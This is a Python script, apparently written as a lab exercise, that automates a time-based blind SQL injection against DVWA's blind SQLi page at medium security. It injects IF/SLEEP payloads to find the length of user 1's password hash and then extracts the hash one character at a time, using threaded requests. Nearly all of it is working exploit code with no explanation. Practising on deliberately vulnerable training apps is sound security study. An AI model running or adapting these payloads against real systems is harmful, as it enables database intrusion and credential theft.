# DVWA Blind SQL Injection (Medium)
# Time Based

import requests, argparse, concurrent.futures, time

http_proxy = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def lenSQLi(target, inj, sessid, verbose=False):
    def check_length(i):
        url = f"http://{target}/vulnerabilities/sqli_blind/"
        payload = f"1 AND (IF(LENGTH((SELECT {inj} FROM users WHERE user_id=1 LIMIT 1))={i}, SLEEP(1), 0))"
        header = {'Content-Type': 'application/x-www-form-urlencoded'}
        cookies = {'PHPSESSID': sessid, 'security': 'medium'}
        body_req = f"id={payload}&Submit=Submit"
        try:
            if verbose:
                r = requests.post(url, headers=header, cookies=cookies, data=body_req, proxies=http_proxy)
                if r.elapsed.total_seconds() > 1:
                    return i
            else:
                r = requests.post(url, headers=header, cookies=cookies, data=body_req)
                # in my case without using proxy the time will take +1 second if condition are not met (id missing) :/
                if r.elapsed.total_seconds() > 3:
                    return i
        except Exception as e:
            print(f"Error occurred: {e}")
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(check_length, i) for i in range(1, 33)]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                return result

# def extractSQLi(target, inj, sessid, verbose):
#     url = f"http://{target}/vulnerabilities/sqli_blind/"
#     for i in range(32,127):
#         payload = inj.replace("[CHAR]", str(i))
#         header = {'Content-Type':'application/x-www-form-urlencoded'}
#         cookies = {'PHPSESSID': sessid,'security': 'medium'}
#         body_req = f"id={payload}&Submit=Submit"
#         try:
#             if verbose:
#                 r = requests.post(url, headers=header, cookies=cookies, data=body_req, proxies=http_proxy)
#                 if r.elapsed.total_seconds() > 1:
#                     return i
#             else:
#                 r = requests.post(url, headers=header, cookies=cookies, data=body_req)
#                 if r.elapsed.total_seconds() > 3:
#                     return i
#         except requests.RequestException as e:
#             print(f"Error occurred: {e}")
#     return None

# def sendSQLi(target, r, inj, sessid, verbose=False):
#     extracted = ""
#     for i in range(1, r+1):
#         payload = f"1 AND (IF(ascii(substring((select {inj} FROM users WHERE user_id=1 LIMIT 1),{i},1))=[CHAR], SLEEP(1), 1))"
#         exval = extractSQLi(target, payload, sessid, verbose)
#         if exval:
#             extracted = chr(exval)
#         else:
#             break
#         # masih tidak secepat lenSQLi
#         # with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
#         #     futures = [executor.submit(extractSQLi, target, payload, sessid, verbose)]
#         #     for future in concurrent.futures.as_completed(futures):
#         #         exval = future.result()
#         #         if exval:
#         #             extracted += chr(exval)
#         #             # print(chr(exval), end="", flush=True)
#         #         else:
#         #             break
#     return extracted

def sendSQLi(target, r, inj, sessid, verbose=False):
    extracted = ""
    url = f"http://{target}/vulnerabilities/sqli_blind/"
    def extract_data(i, payload):
        payload = payload.replace("[CHAR]", str(i))
        header = {'Content-Type':'application/x-www-form-urlencoded'}
        cookies = {'PHPSESSID': sessid,'security': 'medium'}
        body_req = f"id={payload}&Submit=Submit"
        try:
            if verbose:
                r = requests.get(url, headers=header, cookies=cookies, data=body_req, proxies=http_proxy)
                if r.elapsed.total_seconds() > 1:
                    return i
            else:
                r = requests.get(url, headers=header, cookies=cookies, data=body_req)
                if r.elapsed.total_seconds() > 3:
                    return i
        except requests.RequestException as e:
            print(f"Error occurred: {e}")
        return None


    for i in range(1, r+1):
        payload = f"1 AND (IF(ascii(substring((select {inj} FROM users WHERE user_id=1 LIMIT 1),{i},1))=[CHAR], SLEEP(1), 1))"
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = [executor.submit(extract_data, i, payload) for i in range(32, 127)]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                
                if result is not None: 
                    extracted += chr(result)
                    print(chr(result), end="", flush=True)
                    break

    return extracted
        

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target','-t',required=True,dest='target',help='DVWA Host Target')
    parser.add_argument('--session','-s',required=True,dest='session',help='DVWA Session')
    parser.add_argument('--verbose','-v',action='store_true',dest='verbose',help='Turn on verbose to Burp')
    args = parser.parse_args()

    target_url = args.target
    phpsessid = args.session
    verbose = args.verbose
    
    length = lenSQLi(target_url, "password", phpsessid, verbose)
    print("Length Password: " + str(length))
    start_time = time.time()
    pshs = sendSQLi(target_url, length, "password",phpsessid, verbose)
    end_time = time.time()
    duration = end_time - start_time
    d_min = duration / 60
    print(f"\nHash Password: {pshs}")
    print(f"Time consumed: {d_min:.2f} minute")

if __name__ == "__main__":
    main()